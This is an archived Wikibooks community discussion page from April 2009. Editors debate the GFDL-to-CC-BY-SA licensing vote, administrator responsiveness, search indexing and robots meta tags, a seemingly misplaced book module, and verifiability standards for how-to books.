* The new GFDL 1.3 includes a special &quot;Wiki clause&quot; that allows migration to CC-BY-SA-3.0, a license which is considered to be similar in spirit to the GFDL, but makes the reuse of content a little bit easier for end-users.
* Easier reuse is ideal for large multi-author wiki websites like Wikipedia and Wikibooks, where a page's authorship may be a large and complex list of authors and editors, along with the creators of embedded images, etc. In short, currently our licensing issues are a complex nightmare, but with CC-BY-SA it all will get a little bit easier.
* The Wikimedia Foundation is one of the primary users of the GFDL license. Most other open-content and open-education organizations use CC-BY-SA, so currently our material is not compatible with theirs. This means we can't share content, we can't reuse content that they have, and they can't reuse content that we have. People who are trying to build free materials have fewer options because of licensing incompatibilities.
* In the past, several authors have requested the ability to license individual books under CC-BY-SA. However for a variety of reasons, this has not been allowed on Wikibooks. It is generally considered that this initiative will be very beneficial for Wikibooks.

I suggest that all Wikibooks go to [http://meta.wikimedia.org/wiki/Special:SecurePoll/vote/1 Meta and vote] YES on this issue. It will be good for our community in a number of ways, I think. As a bit of a disclaimer, you must have at least 25 edits to Wikimedia projects before you can vote (I think there are some other stipulations about that too, I don't know all the details). Let me know if anybody has any questions about this. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 12:49, 13 April 2009 (UTC)

: I voted NO on this issue. I think this will actually make reuse more difficult for people who would prefer not to use CC-BY-SA. People will have to do more work to be sure they can still use a work under the terms of the GFDL. The proposed also proposes to create requirements for terms of service, to update [[Project:Copyrights]] and a few other things. Right now its more straightforward you use the GFDL for text, no exceptions. With these changes some works might be CC-BY-SA only and some works might not be, more burden is placed on the reusers to get it right which means more people are likely to get it wrong. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:07, 13 April 2009 (UTC)

:*The proposal is detailed at [[Wikimedia:Licensing update]] page.
:*The [http://www.gnu.org/copyleft/fdl.html GFDL v1.3] is already in effect and does affect all content present on Wikibooks our license states [[Wikibooks:Copyrights|&quot;or any later version published by the Free Software Foundation;&quot;]]
:So what is on the table now is required to permit the adoption of CC-BY-SA-3.0 content into the Wikimedia projects (since GFDL v1.3 is one sided on the permission to adopt the other license).
:The above post by Whiteknight mentions that dual license works are not allowed on Wikibooks, this is not exactly correct, and we recently had a discussion about at least one Wikibook that is dual licensed, nor is the opinion that we should fight multiple licenses consensual, but is certainly problematic and having clearly stated that CC-BY-SA-3.0 will also cover our work with the other changes proposed would clarify the use of dual licenses on Wikimedia projects (reinforcing the GFDL that was probably mortally hit with this one sided change), not the optimal solution for Wikibooks but the best available and required for the future growth of Wikimedia. I share with Darklama some of objections to the extra proposals attached as required to make it all work but don't agree with the generalization of the text to all Wikimedia projects, so I will abstain to vote.

== Is there any wikibook being imported from a GFDL source? ==

Hi!
I'm a wikibookian at pt.wikibooks and I'm worried about some consequences of the [[meta:Licensing update|licensing update]] for imported books that came from GFDL sources. Specifically, the problem is mentioned in 3b, [http://meta.wikimedia.org/w/index.php?title=Talk:Licensing_update/Questions_and_Answers&amp;oldid=1460068#Some_questions here].

Do you have (or had) some wikibook being written based on a external GFDL source? [[:pt:User:Helder.wiki|Helder]] 23:51, 14 April 2009 (UTC)
== How is everything here?! honestly ==

Our friend administrator Swift seems to be alone here... How is everything in Wikibooks English? Who is part of the administrators team? I have the feeling that things are too serious here, there is not much public relations concern. We need some enjoyment, some fun, while working. Kind regards [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 12:48, 6 April 2009 (UTC)

'''&lt;big&gt;Wikibooks has 29 admistrators&lt;/big&gt;''' according to [[Wikibooks:Administrators/Unstable]]: '''11 of them don't contribute for more than 6 months. 7 don't contribute for more than one year. Conclusion: half of them are gone.

Thanks, Mike, a slightly defensive answer is better than nothing. I don´t find the policy [http://en.wikipedia.org/wiki/Wikipedia:Ignore_all_rules Ignore all rules] written anywhere in Wikibooks, if it is here, it's well hidden. IAR has a lot do to with things I mentioned, since it helps to avoid conservative practices that slow down wikiprojects development. As you know, volunteer work in an institution does not mean that the volunteer can choose what to do, and what not do to, or when to work, and how to do it. The responsabilities of a volunteer has to do with his position in the institution, not with his moods, and personal preferences. '''At this moment, there is no leadership in Wikibooks.''' I asked for some help, but people seem to be &quot;looking busy&quot;. Maybe I have a wrong impression and everything here is great and working just fine (except for me). I would like to propose the creation of a Public Relations Lounge, in a visible area, with friendly administrators and editors (people with time to be nice and inspiring). The Contact Us page is very unfriendly (when we get there we find out it is in fact a &quot;contact them&quot; page), not another Reading Room, but a place to exchange communication and working ideas. kind regards, [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 15:24, 21 April 2009 (UTC)

Dear Panic, thanks for your kind considerations and balanced answer. That is just what a newcommer needs. You are a leader, like it or not. I do participate in other projects, and I feel other communities have a better atmosphere, from my point of view. Swift, I am not demanding anything, I am talking about honest volunteer work. This is a discussion page, I have the right to keep talking about something, (until I get a good Panic answer), and to make remarks, that I consider important, specially when administrative attention is required. Since you say it could be because of me, I have to remember that my experience in wikibooks was bad from the start, I am an authentic bitten newcomer, by you. But that dispute was deleted, and I hope you don´t point your finger to me again. You all have a nice day [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 09:47, 23 April 2009 (UTC)

It is correct that Wikibooks does not have a page on IAR. Nevertheless, a true leader would tell the truth: IAR is policy, and always has been. A failure to recognize that is just that: a failure.

If you need help with something, all you have to do is ask - there are people around to help you if you do so. What we are not here to do is somehow (by magic?) guess at what help you need, when you say things like &quot;How is everything here?! honestly.&quot; The fact of the matter is that you ''didn't'' ask for help, so you got none. People ''actually are'' busy (not just seeming that way) - it's no surprise that they're somewhat less enthusiastic than you may like to respond to nonsensical comments. If you have concrete ideas about PR or improving the way the community communicates amongst themselves, then by all means, make such a proposal, or implement it immediately if appropriate. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 20:07, 23 April 2009 (UTC)

:IAR is chaotic, there is no direction to it. Accepting it as an unwritten policy is very dangerous if communicated to others. I can see it being accepted as such at a personal level at various degrees but as a public written policy it is too dangerous, it requires one to be open to challenges (on his interpretation of things, on his views of how they are and should be). It leads to many time sink discussion and on generating endless conflicts.
:It is against other policies, as a Wikibookian one is expected to enforce any policy and verify adherence to guidelines, defending the IAR negates all that.
:What IAR truly does is empower people to do as they like, with disregard to what others have done before, it's a BeBold on steroids, that can even be used to deny itself. We are better off with our BeBold policy, the need to enforce all policies  and the understanding that guidelines are to be fallowed but the community accepts that there could be instances where exceptions can exist...
:I understand there is something appealing about not needing to know the rules to be able to participate, but that isn't a realistic expectation, people need to understand how to interact with others, know the GFLD, how to use the Wikimedia software and many other rules/presets before interacting with the project. Expecting that they understand what the project is about and how they are expected to perform here is just as natural, ignorance can't be a justification to trample on others.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 17:04, 24 April 2009 (UTC)

So, why didn't I reply? Well, I saw your book - which you created straight after your dispute with Swift - as a direct attack on the Wikibooks community (&quot;How to do nothing, dedicated to Wikibooks&quot;) and not created in good faith. I've seen little contribution from you since, which is fine as no doubt you are busy. However, slightly sarcastic comments directed at the community for not doing much, which is how I read your contribution to this page, does nothing to encourage me to engage in friendly conversation right now. Can I suggest you continue to contribute to the content and avoid being judgemental about other people's contribution as a starting point to engaging in a positive way here. Thanks. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

Hi everybody. Thanks for the comments. I will revise my approaches, as I hope wikibooks revises the quality of the replys in everyday routine (that is my main issue)(so we wouldn´t need this conversation), although the replys in this discussion are very good. Let me say somethings in a very calm way: '''1)'''I did ask for help many weeks ago and didn´t get it (on the Categorization topic of this page, and also in the discussion page of the book I initiated). '''2)''' since I felt bitten in my first aproach to wikibooks, and I am not getting much help, I do feel less motivated to contribute more here. '''3)''' The How to Do Nothing book is not an insult, and Swift even helped with orthographic corrections, and other things that I thanked her. '''4)''' How to Do Nothing is a serious book, I exercize Tai Chi Chuan, I read the Art Of War chinese book, I am a clown (as a clown I do nothing very well), I am an artist, so I enjoy contemplation. '''5)''' My first idea was to never come back here again, and just participate in other wikiprojects, but I thought I should not feel intimidated by a first bad experience, and I decided to write a text, so I could maybe get more respect as a &quot;contributor&quot;. '''6)''' My dispute with Swift, that I tried to forget, started when I wrote an unsigned comment in the discussion page of the Dutch book (I found the book not very educational, as I wanted to learn Dutch). I decided not to sign that comment, but I was logged in, so I could be tracked. And I was tracked: Swift edited my post and put my signature in it, with a link to my contrib page. (since my contrib page in wikibooks was empty I saw that as a way to disqualify my comment). Swift also told me to be bold (without knowing my Dutch knoledge). When I complained to her (or he) about her editing in my post, she told me it was &quot;standard procedure&quot; in unsigned posts, I was not happy with her replys about this and decided to end the dispute, and deleted everything about it. I thought that the reply on my critic comment was unappropriated, specially for an administrator. Than I wrote the How to Do Nothing book, so next time an administrator decides to advertise my contrib, I could show something. The book was inspired in the incident, since I found an administrator doing more than what she should. '''Conclusion:''' I thought that dispute was over, but some replys right now demonstrate some people didn´t forget about it, and suggest that I am really being neglected, as I thought. That is why I see peolple looking busy, because they pretend not to see me. I am satisfied with this conversation. Best regards, [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 13:49, 24 April 2009 (UTC) PS: that incident brings other questions, that could be discussed later: Should people be forced to sign? Is a &quot;standard procedure&quot; necesseraly correct? Is it really a &quot;standard procedure&quot; (to show someone´s identity, and contribution)?
: Ricardo, do you find the atmosphere better at other wiki projects to which you are contributing? What are these wiki projects; is it Wikipedia or Wiktionary or another project? What is the language of the wiki project to which you contribute, and which drives your expectations about how a wiki community should work? What is it that you think the English Wikibooks can learn from the other wiki communities? It is normal or usual that people do not sign their comments at these communities? --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 07:22, 25 April 2009 (UTC)

Hello Dan. I find better atmosphere in 5 projects (if I spoke other languages I would probably find others): Wikipedia English, Wikipedia Português, Wikiversity English, Wikiversidade Português, and Wikilivros (portuguese)(I contribute more in 3: Wikipedia English and Portuguese, and Wikiversidade). I never had problems anywhere, never had help request unanswered. I have seen unsigned comments (hard good comments) in Wikipedia Português (unsigned and unlogged in), it is not common, but tolerated (normal). I always sign my comments: in wikibooks I tried my first and last unsigned comment, unfortunately that led to a dispute. (contradictory experience: to be logged in is not better, since the profile is visible, and was shown, as I didn´t expect). I believe it is more important to read the message than to chase the writer.
Wikibooks can learn with other projects to have more sense of humor and tolerance. (one administrator in portuguese even keeps a public list of well known &quot;over bold IPs&quot;). I see administrators in other projects really enjoying what they do, things look too serious here, and that is not very convincing. As you known, anybody can edit any page in wikipedia, &lt;u&gt;nobody is obligated to be registered, or logged in to contribute.&lt;/u&gt; So I kindly question, why expose the editor of a comment? And why insert a link to his contrib page? I agree signing is a guideline, but not signing is not an ofense. If someone really wants to see a signature could just ask &quot;please, sign your comments&quot;. 
If there is an unsigned post in a user personal page, then in his own page the user may expose the editor and contrib page (and do other things), but I don´t find correct to do it automatically in all discussion pages. &lt;u&gt;In some situations identity discretion is good&lt;/u&gt;: example, someone could feel unconfortable to comment bad writing about religion, racism, fascism and other sensitive issues. Swift works in good faith, so do I, we just had a cultural encounter. (I think I ended that dispute too soon). (I also learned that it is better to contribute and focus more on fewer projects).

:: Some books go a long time with only a single contributor. Nobody is holding the book hostage. Feedback isn't that rare, feedback comes in many forms. Skipping lines or using a different paragraph isn't really enough to tell where one person's comment or response begins and ends. Expecting assistance or expecting people to get your meaning when they don't is also not fair, and could be why people don't assisted you. You don't have to leave unless you wish to.

== Artificial Consciousness Book ==

I have written a series on Artificial Consciousness, I would like to discuss with someone whether or not WikiBooks is a suitable place to publish it, what the implications are for copyleft, and what costs are for printing it. Through your sister organizations. It needs editing, so a collaborative editing environment might not be a bad thing.

As well, I am building a Portal on Wikiversity, and I want to consider a library location for works that have been released under a copyleft licensed and those that have lapsed. Is this more properly discussed with WikiSource?

: Welcome to Wikibooks!
: Your first stop should definately be [[Wikibooks:What is Wikibooks]] if you haven't checked it already (sorry, it isn't the simplest introduction to the project). Wikibooks is not really the ideal place to ''publish'' anything as it is more designed to collaborate on authoring. Content on Wikibooks is potentially in constant flux and no version final. Wikibooks would be a great place should you wish to make your content available for collaboration. Note, however, that most books have few contributors and you may wish to explicitly solicit help, here on Wikibooks in the [[Wikibooks:Reading room/Projects|projects reading room]], through internet forums on related topics or even real life.
: The main implications of the Wikibooks license is that anyone can copy the content or create derivative works, but must give attribution to past contributors. Once you release the content under the GFDL, you loose copyright control over it.

== CLEP and DSST Study Guides ==

Based on an entry on the talk page regarding CLEP exams on wikipedia, I have taken on the ambitious project of creating study guides for these exams.  So far I have created catagories for [[Catagory:CLEP|CLEP]] and [[Catagory:DSST|DSST]].  I am working on [[DSST A History of the Vietnam War|DSST A History of the Vietnam War]].  I am here to solicit assistance on this project.  Writing the study guide is a great way to study for the exam, if you need the class.  That's why I'm doing it.  For each exam there is a fact sheet that has an outline of the required topics.  I am following this outline in setting up the study guide.  I am changing the wording of everything to respect the copyright, however I am attemting to preserve each idea.  I am in the military so I have free access to all of the fact sheets.

== consistent template for author profiles in wikibooks ==

hi, i am writing the animal behavior textbook &lt;http://en.wikibooks.org/wiki/Animal_Behavior&gt; and would really like to include the profiles of various significant thinkers along with their ideas. wikipedia has an infobox template that does what i am thinking of &lt;http://en.wikipedia.org/wiki/Nikolaas_Tinbergen&gt;. is there an approved way of doing this in wikibooks? if so, how do i do this? if not, how can i get such a template started? thanks a major stack [[User:Robert Huber|Robert Huber]] ([[User talk:Robert Huber|talk]]) 10:28, 15 April 2009 (UTC)

: There few restrictions on template authoring or usage. If you'd like, you could request for the infobox to be [[WB:RFI|imported]] to Wikibooks.
: Ideally, we would have better categorisation of our existing templates so that you could browse related templates and get ideas for authoring your own. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 18:06, 15 April 2009 (UTC)

:: thanks a stack swift. i think i would be most interested in authoring my own template for including the bios of significant people. how hard is this? i have made a template for a little stub before, but this seems a lot more complicated than that. is there a webpage that describes creating custom templates with multiple fields for this? i think it would not be a bad idea to include the infobox in wikibooks anyway. i would start with that and then convert as i learn to do my own templates. i am requesting an import of the infobox feature as well. thanks again and all the best, [[User:Robert Huber|Robert Huber]] ([[User talk:Robert Huber|talk]]) 13:43, 16 April 2009 (UTC)

Hello,

This template doesn't work properly when the page passed in as a parameter is not in the main space. See [[User talk:វ័ណថារិទ្ធ]] as an example. The problem is, I think, that the parameter being passed in is the page name (in this case, [[Cookbook:Cuisine of Cambodia]]) and the same parameter is also used to link to the relevant page's talk page by inserting the page name after &lt;nowiki&gt;[[Talk:&lt;/nowiki&gt;. For Cookbook, etc., this doesn't work as the talk pages are named &lt;nowiki&gt; [[Cookbook talk: not [[Talk:Cookbook:&lt;/nowiki&gt;. I can't for the life of me think of an easy way of fixing this, surely it can be done?! Ideas? &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

== Finding WikiBooks pages by Google ==

Hello. Could an admin please advise me on these points?
*When a new page is made in Wikibooks, how long will it be before the page could be found in a suitable Google search?  Is the caching availability of pages by Google modified by admin action or is it all available to it?
*Is there any way to better make a page known to outside searchers?
*I notice that ''Wikipedia'' pages are invariably available in searches but that ''Wikiooks'' pages rarely are; (''I mean, not even on page twenty!''); this happens when ''Wiki'' is specified without saying which is intended, or indeed when WikiBooks ''is'' specified, and when it is nonetheless known that a substantial page exists in each.   What is going on with it?

Thanks in advance for any assistance?[[User:Armchair|Armchair]] ([[User talk:Armchair|talk]]) 15:10, 20 April 2009 (UTC)

:I would guess that Google indexes the site about once a month. That is not under our control. The Google spider views the site as an anonymous user, so if a page is flagged, they will see the flagged version, even if there are newer, unflagged versions. I'm not sure what you mean about &quot;the caching availability of pages by Google&quot;.
:[[w:Google_pagerank#Description|Google PageRank]] is based on incoming links from popular sites. In theory one can try to boost search results, but I would recommend against it for a number of reasons. A better indicator is probably Alexa rankings, which measure traffic.
:Yes, Wikibooks appears low in many search results - that is not surprising. We are still a young and growing project. If one is concerned with growing Wikibooks to be a successful and sustainable project, there are more important issues than how high we rank in Google. For example, we need more people writing content. That is a prerequisite to rising in search indexes, and while rising in the indexes will bring more contributors, we cannot rely on that as a means to increasing our participant base. Instead, we need to do outreach with like-minded groups (both within Wikimedia and in the wider communities of education and free culture), bring them onboard and reap the benefits. While knowing what needs to be done is only the first step towards doing it, it is still a step. We need people who can actually do these things.

::&quot;we need more people writing content&quot;...so that in effect means you need more people to find the site. The most popular way is Google. Wikibooks has some great content btw the [[Chess]] book it's not bad at all. Yet the [[W:Chess]] shows up on the first page while the wikibooks version shows up(for me) on the 23 page. [[W:Chess]] is going to get thousands of visits a day from Google while [[Chess]] possibly isn't going to get any.

For the other two points mentioned: that may be true, but artificially increasing incoming links or how often content changes are likely to be more of a hindrance than a help. Our goal should be to improve the project (which will have the ''result'' of increasing Google rankings). It would be a terrible idea to seek to increase our Google rank (which is supposed to have the result of improving the project - questionable at best).

&lt;poem&gt;Hi Guys 'n Gals,
I was elsewhere in the web recently and came across a thing called ''The Robots Exclusion Protocol''.   This protocol allows a webmaster to exclude spider caching, (yes, this is the right expression!), as well as preventing its following of links on a page.   It was interesting since I am fairly ignorant on such things.   A site that discusses the exact coding used is at [http://googleblog.blogspot.com/2007/02/robots-exclusion-protocol.html Robots Exclusion Protocol].

A page that I had written recently was noted not to be listed by google, and an incoming link was disregarded by spidering too.   In fact, the ''What links here'' page did not acknowledge it either.
It was no surprise to find the following META tag on the unlisted Wikibooks page:
'''&lt;nowiki&gt;&lt;meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot; /&gt;&lt;/nowiki&gt;'''
This tag has the effect of having robots ignore indexing the page and not indexing along its outgoing links.

'''Always bearing in mind the rather high minded and arrogant answer to my original question, do you suppose that this above fact might be relevant?'''   
Regards to all the good guys,&lt;/poem&gt; [[User:Armchair|Armchair]] ([[User talk:Armchair|talk]]) 13:51, 27 April 2009 (UTC)

: External links have nofollow attached to them, presumably to discourage people from using wikimedia projects to increase there google rankings. Pages in the User: namespace use the meta tag with noindex,nofollow presumably to keep results focused on a project's main contents. Recent versions of mediawiki introduced the &lt;nowiki&gt;__NOINDEX__&lt;/nowiki&gt; magic word so other pages could be prevented from being indexed. Perhaps the page in question is in the user namespace, or makes use of the new magic word? The magic word could be contained in some template you use as well. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:36, 27 April 2009 (UTC)
:: Checking the [[Japanese]] book, I was surprised to find that it had the robots meta tag. I checked all the included templates and none of them have that tag. The [[Japanese#Related wikibooks|Related wikibooks]] section lists a few books, none of which have that tag. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 20:28, 27 April 2009 (UTC)
::: Seems this is a problem with FlaggedRevs. Once pages have been sighted, only the stable versions get noindex.

: Just a quick note on the replies to the original question: I, for one, didn't take the same impression away from the reply. While there may be problems with some books not being indexed as they should (see my comment with the same timestamp, above) the fact that books I've contributed to have never risen terribly high in Google's ranking never struck me as that odd. It takes time and my experience with own content on the web is that Google does a pretty good job at rewarding quality (though region specific results are a pain in the ass). I would have, too, recommended that you concentrate on content, figuring that the MediaWiki guys and our WB techies were on the ball. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 20:28, 27 April 2009 (UTC)

Hi, The &lt;u&gt;main point&lt;/u&gt; I think is that many pages, the ones that carry these offending metatags, will ''never'' attain a listing by search engines as long as the metatags are in place.   ''This'' fact will remain a fact ''regardless of the quality'' of the page or ''the time that passes''.   

Who controls the use of the Robots Exclusion Protocol metatag on Wikibooks pages and what are the conditions for their use?   I note that the reason that comparable pages in Wikipedia have good listings - not necessarily good ''pages'' - is that they do not suffer from this imposition.

Many, I suspect, will not make the effort of producing pages for Wikibooks because of such 'poor exposure' for their work.  The project needs to ''attract'' writers.   The more visitors that the project has, the more writers that will likely spring from them.   Judging by the web figures, Wikibooks needs all of the exposure that it can get - not less.    

I have the distinct impression that these comments about the blocking of spidering would rather not be heard by some. Perhaps this is because it flies in the face of the much-preached rhetoric on ''open systems''; or perhaps some administrators have denied that such blocking takes place too often to feel entirely comfortable.

Let me put it this way; if this is an &lt;u&gt;open&lt;/u&gt; system, Wikipedia is a &lt;u&gt;more open&lt;/u&gt; system, and for this and other reasons is likely to always attract the help that it needs.   [[User:Armchair|Armchair]] ([[User talk:Armchair|talk]]) 17:28, 28 April 2009 (UTC)

: ''I'' believe that the ''main point'' is that you haven't pointed out a single page which presents the robots metatag to anonymous users. I've just checked a number of pages ([[Garageband Quick Tutorial]], [[Coping with male pattern baldness]], [[G.E.D. Curriculum]], [[Immunology - Transplants]], [[Puppy Linux/Getting]], [[Puppy Linux]], [[FHSST Physics Electricity:Power calculations]], [[Introduction of PLE]], [[Social Ballroom/Introduction]], [[Social Ballroom]], [[Manx/Contents]], [[Manx]] and the [[Main Page]]) and not one has the tag. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 21:58, 28 April 2009 (UTC)

Has a module from the [[Evolution of Operating Systems Designs]] book been accidentally torn out and lost, and a module from some completely different book been crammed into its place?

: I just took a look. I don't see anything to suggest pages were ripped out or content was lost. Doing some checking of the history of each page suggests that the book was abandoned long ago.

I took a look at it and there were some obvious errors and a lot of omissions such as starting their history with unix, and starting a history of the CP derivatives with CP/M which was a CP clone written for mini-computers, deriving Mac OSX from Mac OS9, and so on. I can see why he thinks that the book is interfered with, the modules are all smushed together, and the information on two languages that have been used for operating systems is completely missing while the first language is essentially just quoting a table of contents from another book. Frankly it doesn't look too promising a start. Maybe the original author got run off for &quot;Varifiability&quot;--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 00:12, 22 April 2009 (UTC)

: Since Darklama didn't seem to see what I am seeing, let me point out what I saw:
: The current table of contents at [[Evolution of Operating Systems Designs]] includes these 3 links:
:#[[Evolution of Operating Systems Designs/Languages as Operating Systems#Java]]
:#[[Evolution of Operating Systems Designs/Languages as Operating Systems#Lisp]]
:#[[Evolution of Operating Systems Designs/Languages as Operating Systems#Smalltalk]]
: However, when I click on any of those links, I discover that that module has neither a &quot;Java&quot; section, nor a &quot;Lisp&quot; section, nor a &quot;Smalltalk&quot; section.
: This &quot;suggests&quot; to me that perhaps those sections once existed there, but since then those sections have been &quot;ripped out or content was lost&quot;. (The only other alternative explanation is that those links were created as redlinks, and the referred-to sections never really existed).
: The text of the [[Evolution of Operating Systems Designs/Languages as Operating Systems]] module (at the time I posted my question above) never mentions &quot;Operating systems&quot; or &quot;Lisp&quot; or &quot;Smalltalk&quot;, and so that text doesn't seem to belong in the [[Evolution of Operating Systems Designs]] book.
: That &quot;suggests&quot; to me that perhaps that text -- text that doesn't seem to belong anywhere in the [[Evolution of Operating Systems Designs]] book -- was really intended to go in some other book, and somehow that text was &quot;ripped out&quot; of that other book and crammed into this book.
: Graeme E. Smith later added some good content (Thanks, Graeme!) that seems to belong at [[Evolution of Operating Systems Designs/Languages as Operating Systems]], and I want to keep that there. But what should I do with the rest of the page -- is there a more appropriate book for that information? Or should I delete it? --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 03:54, 26 April 2009 (UTC)

:: I think the alternative explanation is what happened. Someone created section links with the intent to create those sections, but never got around to creating them. I wasn't trying to suggest or imply that I don't see how it could appear that content was ripped out, only that after taking a closer look for myself that I don't see anything conclusive to support that theory. To me the book looks like someone had some ideas, but never got around to finishing what they started. If you think changes should be made, be bold and do so. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:33, 26 April 2009 (UTC)

The page in question, might have been meant as a memnonic or might have been copied in by mistake.
I think part of the problem was that the original author was not familiar with wiki language and thought he needed &lt;nowiki&gt; # &lt;/nowiki&gt; entries to link to sub-pages. In actual fact you need to use headers. I was confused when I first looked at the subpage links because I expected them to be modules, instead they are subheadings within the page. The first page had them as well, but they didn't link well, I changed that to make them more useable. I think it might be a good idea to delete the bottom part of the page, if only because it really doesn't fit the theme of the page I hesitated to do it myself, until I got some agreement from the community that it was an appropriate action. I'm a little gun-shy right now, because of the rejection I got on my own book.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 05:12, 26 April 2009 (UTC)

: Not being familiar with the wiki language is another possible explanation of what happened too. Feel free to be bold in updating the book. You don't need to seek community feedback for every little thing before taking action. Don't let the rejection of OR make you hesitate to contribute. You are far more likely to learn and understand Wikibooks if you are bold anyways. Wikibookians are usually quick to provide feedback and constructive criticism if they see something that could be improved or if something is inappropriate, without even needing to ask for it. Wikibookians usually try to be helpful and informative, but some of us might also come off as a bit harsh and intolerant at times even if that is not our intent. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:33, 26 April 2009 (UTC)

How Verifiable do you need to be for a How-To book?

But there are aspects to my work that I haven't published yet, if only because they are a twist on the usual interpretation and I don't know where to publish, or how to afford to publish, in the case of the two other books in this series I have written, &quot;How Memory Might Work&quot; and &quot;How Mind Might Work&quot; but which I am not putting on this site because they are definitely proprietary. I put this book here, because it is the least proprietary, it depends only lightly on my personal interpretation, but if the community thinks it is too radical for you, or placed here too early in the publishing cycle, I will understand.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 14:28, 21 April 2009 (UTC)

: Completely verifiable; just like all wikibooks :-) Research needs to have been adequately peer reviewed. Anything from professional journals is fine, but Wikiversity is out. Sorry if we're too main-stream for you.

Oh sure, Completely verifiable, and how many journal articles did the Paint.net book require? I am not writing my research here, I am writing a how-to book. It's not that you guys are too mainstream, No you have been brainwashed by run-away credentialism so that if someone even hints at originality you have to squash them. Why would I want to publish it on Wikiversity, it's a book, not a course! There is nothing in What is Wikibooks that even hints that it is verbotten. Excuse me if I think that you guys don't know the difference between a How-to book, and an omnibus, otherwise you would know that you need different standards for different markets. This book may be aimed at geniuses, and savants, but it not meant to be a scholarly book, just an informal set of hints to make your time more productive if you are a genius or a savant. If you are afraid of a little originality then that is a reason why people are abandoning this project. Creativity and Originality go hand in hand.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 00:35, 22 April 2009 (UTC)

: I don't know of anyone whose been brainwashed or thinks credentials matter. Credentials can also be considered unverifiable. Wikibooks has its own standards. Books hosted by Wikibooks are intended to be education and useful for teaching, learning from and studying from. Books need to be correct in order to accomplish Wikibooks' goals. Wikibooks doesn't require that books prove their verifiability in the same ways as Wikipedia does. You don't have to cite sources for every sentence said like Wikipedia does or include a reference section on every page like Wikipedia does. Wikibooks only asks that books include a bibliography-like page/appendix with references to other material that can be considered reliable so that other people can verify what is written for themselves. Wikibooks recognizes that books have different audiences (see [[Wikibooks:Reading Levels]] for instance) and what references are used should reflect the audience. Did you miss the [[WB:OR]] section of WB:WIW, specifically point 2? I believe that is what Swift is referring to with regard to research. A book for geniuses and savants needs to have references that geniuses and savants can use to verify the book's material. Without some way to verify what is written, we have no way of knowing whether its true or if people are making things up as they go. I could be creative and say the sky is red, the grass is purple and 1+1 is 3, but that doesn't make it true. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 01:47, 22 April 2009 (UTC)

Ah... So even for how-to books, you expect a bibliography, well that is a completely different thing, than &quot;Completely Verifiable&quot; which is what swift actually said. After seeing what a hash that has made of Wikipedia, I have no interest in line by line verification, and in the area that I work in, there are few enough sources that I would be hard pressed to find so many references. I can do that appendix page easily, but it won't be up to some rarified academic standard. The original parts are in the interpretation not in the data on which it is based. I still think that it is a bit of an overkill for a How-to book, but I can accept that someone might want to know where I get my data from, and the printer will love it, since it will expand the size of the book. It might take some time, since I don't live for bibliographic information, and I want to build the wordlist first, but it can be done. Is there anything else that I have missed that is critical for acceptance, or is that the main point? Swift didn't have to invite me to leave, in order to make THAT point. On the other hand, this [[WB:OR]] while it says it is not a place for original research does not say that there is no room for orignality. Lets be clear here, a How-to book is not a Research Paper! Nor is it usually considered fiction or literature per se. I don't think I am being a wiki-lawyer to point that out! I think that swift is wikilawyering me, because I admit to some originality in my interpretation of the data.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 06:42, 22 April 2009 (UTC)

